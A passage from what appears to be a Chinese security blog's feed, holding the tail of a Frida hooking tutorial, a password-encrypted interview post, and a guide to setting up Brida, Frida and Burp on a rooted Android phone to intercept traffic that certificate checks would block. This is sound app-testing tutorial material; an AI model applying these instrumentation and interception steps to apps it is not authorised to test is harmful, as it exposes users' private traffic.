class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">'type'</span>] == <span class="string">'seend'</span>:</span><br><span class="line">        print(<span class="string">"[*] &#123;0&#125;"</span>.format(message[<span class="string">'payload'</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open (<span class="string">"./demo3.js"</span>,<span class="string">"r+"</span>) <span class="keyword">as</span> jsfile:</span><br><span class="line">    jscode=jsfile.read()</span><br><span class="line"></span><br><span class="line">device =frida.get_usb_device()</span><br><span class="line">pid = device.attach(<span class="string">"com.example.a11x256.frida_test"</span>)</span><br><span class="line">script=pid.create_script(jscode)</span><br><span class="line">script.on(<span class="string">"message"</span>,on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span> :</span><br><span class="line">    script.exports.call()</span><br></pre></td></tr></table></figure><h2 id="0x02-参考资料"><a href="#0x02-参考资料" class="headerlink" title="0x02 参考资料"></a>0x02 参考资料</h2><p><a href="https://11x256.github.io/" target="_blank" rel="noopener">https://11x256.github.io/</a><br><a href="https://frida.re/docs/javascript-api/" target="_blank" rel="noopener">https://frida.re/docs/javascript-api/</a><br><a href="https://github.com/r0ysue/AndroidSecurityStudy" target="_blank" rel="noopener">https://github.com/r0ysue/AndroidSecurityStudy</a><br><a href="https://eternalsakura13.com/2020/07/04/frida/#more" target="_blank" rel="noopener">https://eternalsakura13.com/2020/07/04/frida/#more</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;hook神器FRIDA&quot;&gt;&lt;a href=&quot;#hook神器FRIDA&quot; class=&quot;headerlink&quot; title=&quot;hook神器FRIDA&quot;&gt;&lt;/a&gt;hook神器FRIDA&lt;/h1&gt;&lt;h2 id=&quot;0x00-安装&quot;&gt;&lt;a href=&quot;#0x00-安装&quot; class=&quot;headerlink&quot; title=&quot;0x00 安装&quot;&gt;&lt;/a&gt;0x00 安装&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;使用python 一键安装&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pip3 install frida&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pip3 install frida-tools&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;&lt;p&gt;在安卓手机上安装frida-server&lt;/p&gt;
&lt;p&gt;下载地址&lt;a href=&quot;https://github.com/frida/frida/releases&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/frida/frida/releases&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;搜索frida-server，现在的手机一般都是arm64，平板是x86选择对应的版本下载&lt;/p&gt;
&lt;p&gt;使用adb工具将firda-server推送到已root手机的/data/loca/tmp中（其他目录也可以，一般是使用这个目录）&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;adb push frida-server-14.2.7-android-arm64 /data/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/tmp &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;adb shell chmod +x /data/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/tmp/frida-server-14.2.7-android-arm64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;adb shell /data/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/tmp/frida-server-14.2.7-android-arm64&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
      <category term="工具使用" scheme="https://sunny250.github.io/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
      <category term="frida" scheme="https://sunny250.github.io/tags/frida/"/>
    
      <category term="hook" scheme="https://sunny250.github.io/tags/hook/"/>
    
  </entry>
  
  <entry>
    <title>sxf面试</title>
    <link href="https://sunny250.github.io/2020/11/14/sxf%E9%9D%A2%E8%AF%95/"/>
    <id>https://sunny250.github.io/2020/11/14/sxf%E9%9D%A2%E8%AF%95/</id>
    <published>2020-11-14T06:20:01.000Z</published>
    <updated>2021-11-14T06:20:01.000Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none">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</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {document.getElementById("enc_error").innerHTML = "password error!"};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=/js/crypto-js.js&gt;&lt;/script&gt;
&lt;script&gt;
function doDecrypt (pwd, onError) {
	console.log(&#39;in doDecrypt&#39;);
	const txt = document.getE
      
    
    </summary>
    
    
      <category term="面试" scheme="https://sunny250.github.io/categories/%E9%9D%A2%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>安卓渗透工具安装</title>
    <link href="https://sunny250.github.io/2020/11/11/brida%20%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/"/>
    <id>https://sunny250.github.io/2020/11/11/brida%20%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/</id>
    <published>2020-11-11T02:25:34.000Z</published>
    <updated>2020-11-11T02:25:34.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="brida-安卓渗透工具安装"><a href="#brida-安卓渗透工具安装" class="headerlink" title="brida 安卓渗透工具安装"></a>brida 安卓渗透工具安装</h1><p>阅读此文需要一点点基础，如有不懂，可直接私聊作者</p><p>进行安卓测试时，会出现一些数据包抓不到的情况，究其原因是因为做了https程序校验。此时brida就派上用场了。</p><h3 id="1-安装-pyro4"><a href="#1-安装-pyro4" class="headerlink" title="1. 安装 pyro4"></a>1. 安装 pyro4</h3><p>有python3环境的可以直接安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pyro4</span><br></pre></td></tr></table></figure><p>有python但是没有pip的例如mac os，执行下面的命令即可安装对应python版本的pip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/get-pip.py</span><br><span class="line">sudo python get-pip.py</span><br></pre></td></tr></table></figure><a id="more"></a><p>注：没有python环境的直接去官网下载python安装包即可<strong>（建议3.8.6版本）</strong>，其他版本未测试</p><h3 id="2-安装frida-compile"><a href="#2-安装frida-compile" class="headerlink" title="2. 安装frida-compile"></a>2. 安装frida-compile</h3><p>进入nodejs<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">官网</a>找到对应版本直接下载，根据安装程序一直点击下一步即可</p><p>随后在控制台执行，<strong>在哪里执行，frida-compile就安装在哪里</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install frida-compile@9.5.2.  # 最新版本没有-x选项，作者说近段时间会更新一个没有-x选项的 brida，但是目前还没更新</span><br></pre></td></tr></table></figure><h3 id="3-安装frida"><a href="#3-安装frida" class="headerlink" title="3. 安装frida"></a>3. 安装frida</h3><p>在需要测试的地方pc上安装firda client</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 install -m pip frida</span><br></pre></td></tr></table></figure><p>前往frida <a href="https://github.com/frida/frida/releases" target="_blank" rel="noopener">github</a>上下载对应手机系统版本的frida-server</p><p>安卓64位手机一般是选择<a href="https://github.com/frida/frida/releases/download/14.0.8/frida-server-14.0.8-android-arm64.xz" target="_blank" rel="noopener">friida-server-14.0.8-android-arm64.xz</a></p><p>下载后解压，然后下载adb工具 前往<a href="https://developer.android.com/studio/releases/platform-tools" target="_blank" rel="noopener">官网</a>下载</p><p>使用电脑连接安卓手机（需要root）由于篇幅原因就不在展开如何root，<a href="https://developer.android.com/studio/debug/dev-options?hl=zh-cn" target="_blank" rel="noopener">开启开发者模式</a></p><p>使用控制台进入到adb的目录执行如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb devices</span><br></pre></td></tr></table></figure><p>如果出现了设备，说明连接手机成功。</p><p>随后执行如下命令（需要将frida-server-14.0.8-android-arm64放入adb所在的目录中，知道frida-server的路径也可以直接使用frida-server的绝对路径，就不用移动文件了）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb push frida-server-14.0.8-android-arm64 /data/<span class="built_in">local</span>/tmp <span class="comment">#将frida-server文件导入到手机</span></span><br><span class="line">adb shell   <span class="comment"># 执行完这条命了后即进入了手机的shell</span></span><br></pre></td></tr></table></figure><p>以下命令在手机的shell上执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su <span class="comment">#获取root权限，执行后需要在手机上的root管理器允许</span></span><br><span class="line"><span class="built_in">cd</span> /data/<span class="built_in">local</span>/tmp</span><br><span class="line">chmod +x ./frida-server-14.0.8-android-arm64</span><br><span class="line">./frida-server-14.0.8-android-arm64 &amp;</span><br></pre></td></tr></table></figure><p>此时frida-server已经安装好，并已经运行</p><h3 id="4-安装brida"><a href="#4-安装brida" class="headerlink" title="4. 安装brida"></a>4. 安装brida</h3><p>打开burp suite  选择Extender-&gt;App store找到brida-&gt;点击安装即可</p><p>然后选择brida</p><p>第一项 <strong>python binary path</strong> 选择python的安装目录下的<code>python.exe</code>   win下默认安装路径 <em>C:\pyton3\python.exe</em></p><p>第二项<strong>pyro host</strong>  默认配置localhost即可</p><p>第三项 <strong>pyro port</strong>  默认配置9999即可</p><p>第四项  <strong>frida-compile path</strong> 选择当时安装frida-compile时的路径下的 <code>/node_modules/.bin/frida-compile</code></p><p>第五项 <strong>fridaJS file folder</strong> 随意选择一个具有可读写的目录，然后点击<code>load default js file</code></p><p>第六项 <strong>Application ID/PID</strong> 回到手机的shell，查看需要测试的程序运行的pid. 使用<code>frida-ps -U</code> 然后在列表中找到即可 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python binary path: &#x2F;usr&#x2F;local&#x2F;bin&#x2F;python3(这里选择python可执行文件的位置)</span><br><span class="line">Pyro host: localhost</span><br><span class="line">pyro port: 9999</span><br><span class="line">frida-compile path: &#x2F;node_modules&#x2F;.bin&#x2F;frida-compile(这里选择刚才安装的.&#x2F;bin下面的frida-compile文件)</span><br><span class="line">fridaJS file folder: #这里存在的是将要执行的js代码</span><br><span class="line">Application ID&#x2F;PID: #这里填写要hook的pid</span><br></pre></td></tr></table></figure><h3 id="5-成功启动"><a href="#5-成功启动" class="headerlink" title="5.成功启动"></a>5.成功启动</h3><p>所有步骤做好了之后，依次点击    <code>start server</code>，    <code>attach application</code>出现如下结果说明成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Application with PID 3414 attached correctly    #此处的3414是被测试的程序的pid</span><br><span class="line">Platform: Android</span><br></pre></td></tr></table></figure><h3 id="6-遇到的问题"><a href="#6-遇到的问题" class="headerlink" title="6. 遇到的问题"></a>6. 遇到的问题</h3><h4 id="1、env-node-No-such-file-or-directorys"><a href="#1、env-node-No-such-file-or-directorys" class="headerlink" title="1、env: node: No such file or directorys"></a>1、env: node: No such file or directorys</h4><p>mac 执行如下命令 <code>sudo launchctl config user path/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin</code></p><h4 id="2-Unknown-option-x"><a href="#2-Unknown-option-x" class="headerlink" title="2. Unknown option -x"></a>2. Unknown option -x</h4><p>使用9.x版本，卸载最新的10.0版本，然后下载9.x版本即可</p><pre><code>npm uninstall frida-compile npm install frida-compile@9.5.2</code></pre><h4 id="3-Exception-with-attach-application"><a href="#3-Exception-with-attach-application" class="headerlink" title="3. Exception with attach application"></a>3. Exception with attach application</h4><p>net.razorvine.pyro.PyroException:     [frida.InvalidArgumentError] device not found   </p><p>设备未找到</p><p>net.razorvine.pyro.PyroException:     [frida.ProcessNotFoundError] unable to find process with pid 4908   </p><p>未找到此进程。重新检查程序pid，并重试 </p><h3 id="7-参考"><a href="#7-参考" class="headerlink" title="7. 参考"></a>7. 参考</h3><p><a href="https://developer.android.com/studio/debug/dev-options?hl=zh-cn" target="_blank" rel="noopener">https://developer.android.com/studio/debug/dev-options?hl=zh-cn</a><br><a href="https://github.com/federicodotta/Brida/issues/67" target="_blank" rel="noopener">https://github.com/federicodotta/Brida/issues/67</a><br><a href="https://github.com/federicodotta/Brida/issues/47" target="_blank" rel="noopener">https://github.com/federicodotta/Brida/issues/47</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;brida-安卓渗透工具安装&quot;&gt;&lt;a href=&quot;#brida-安卓渗透工具安装&quot; class=&quot;headerlink&quot; title=&quot;brida 安卓渗透工具安装&quot;&gt;&lt;/a&gt;brida 安卓渗透工具安装&lt;/h1&gt;&lt;p&gt;阅读此文需要一点点基础，如有不懂，可直接私聊作者&lt;/p&gt;
&lt;p&gt;进行安卓测试时，会出现一些数据包抓不到的情况，究其原因是因为做了https程序校验。此时brida就派上用场了。&lt;/p&gt;
&lt;h3 id=&quot;1-安装-pyro4&quot;&gt;&lt;a href=&quot;#1-安装-pyro4&quot; class=&quot;headerlink&quot; title=&quot;1. 安装 pyro4&quot;&gt;&lt;/a&gt;1. 安装 pyro4&lt;/h3&gt;&lt;p&gt;有python3环境的可以直接安装&lt;/p&gt;
